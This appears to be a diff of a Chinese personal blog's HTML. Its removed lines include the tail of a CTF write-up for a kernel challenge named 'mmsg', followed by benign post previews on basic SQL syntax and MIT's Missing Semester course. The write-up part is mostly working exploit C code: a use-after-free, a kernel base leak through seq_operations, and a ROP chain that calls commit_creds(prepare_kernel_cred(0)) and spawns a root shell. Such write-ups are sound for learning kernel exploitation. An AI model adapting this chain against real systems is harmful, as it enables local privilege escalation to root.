kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// 在 64 位环境下，目的寄存器若是 32 位，则会将高 32 位清零</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">			<span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">			<span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">			<span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">		  <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">			: <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">			: </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">	  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">		err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> seq;</span><br><span class="line">	<span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read 操作，经过函数调用链则会最终调用 seq_operations-&gt;start 指针对应的函数</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>rop</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 之前的都一样</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspace地址被标记为non-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用xchg 进行类似栈迁移的操作，从而进行劫持函数执行流</p>
-</li>
-<li><p>在本地执行时，直接kernel panic。查看报错信息，发现是<code>can&#39;t access memory in 0x????(是个用户地址)</code>。</p>
-</li>
-</ul></div><a class="article-more button is-small is-size-7" href="/2023/07/28/peekgeek%20mmsg/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-06-30T02:49:11.489Z" title="2023/6/30 10:49:11">2023-06-30</time>发表</span><span class="level-item"><time dateTime="2023-07-28T15:12:37.816Z" title="2023/7/28 23:12:37">2023-07-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categorievariants/db/">db</a></span><span class="level-item">3 分钟读完 (大约397个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">常用数据库基本语法</a></p><div class="content"><blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/07/28/peekgeek%20mmsg/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">常用数据库基本语法</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-30 10:49:11" itemprop="dateCreated datePublished" datetime="2023-06-30T10:49:11+08:00">2023-06-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:28:13" itemprop="dateModified" datetime="2023-09-01T17:28:13+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/db/" itemprop="url" rel="index"><span itemprop="name">db</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
 <p>简单学习增删改查</p>
 </blockquote>
-<ul>
-<li><p>三个最广泛使用的开源 RDBMS：SQLite、MySQL 和 PostgreSQL。关系型数据库</p>
-</li>
-<li><p>因为SQL的标准，三个数据库差不多的语法。</p>
-</li>
-</ul>
-<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote>
-<p>其实是开源 MariaDB</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/" class="post-title-link" itemprop="url">计算机教育缺失的一课</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-19 10:54:28" itemprop="dateCreated datePublished" datetime="2023-06-19T10:54:28+08:00">2023-06-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:34:20" itemprop="dateModified" datetime="2023-09-01T17:34:20+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>21 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>the Missing Semester of your CS education</p>
 </blockquote>
-<ul>
-<li><p>数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数据类型</p>
-</li>
-<li><p>查询限定</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 结果个数</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><ul>
-<li><p>数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查询</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 去重</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><ul>
-<li><p>sqlite3</p>
-</li>
-<li><p>命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.help;     -- 帮助信息</span><br><span class="line"></span><br><span class="line">.open test.db;  -- 打开文件，如果没有就创建</span><br><span class="line"></span><br><span class="line">.show;     -- 显示一系列属性</span><br><span class="line"></span><br><span class="line">.quit   -- 退出</span><br><span class="line"></span><br><span class="line">.databases  -- 显示数据库</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>创建数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 读取或者创建</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>导入导出数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dump   -- 将数据库导出SQL 文件 </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>创建表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tables  -- 显示表</span><br><span class="line">.schema  -- 表的信息</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">	column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查询</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 还是SELECT 语句</span><br></pre></td></tr></table></figure></li>
-</ul></div><a class="article-more button is-small is-size-7" href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-06-19T02:54:28.071Z" title="2023/6/19 10:54:28">2023-06-19</time>发表</span><span class="level-item"><time dateTime="2023-07-28T15:12:12.693Z" title="2023/7/28 23:12:12">2023-07-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categorievariants/CS/">CS</a></span><span class="level-item">37 分钟读完 (大约5610个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/">计算机教育缺失的一课</a></p><div class="content"><ul>
-<li><p>The Missing Semester of your CS education，共<code>11</code>节课，每节课约1h。</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili 双语字幕</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li>
-</ul>
-</li>
-<li><p>确实不错，手敲命令+讲解。多使用Linux</p>
-</li>
-<li><p>学校应该在大一教这个，而不是TM的大学物理</p>
-</li>
-<li><p>课程网站</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="lectrue1-overview-amp-shell"><a href="#lectrue1-overview-amp-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote>
-<p>主要是 Linux 基本命令</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
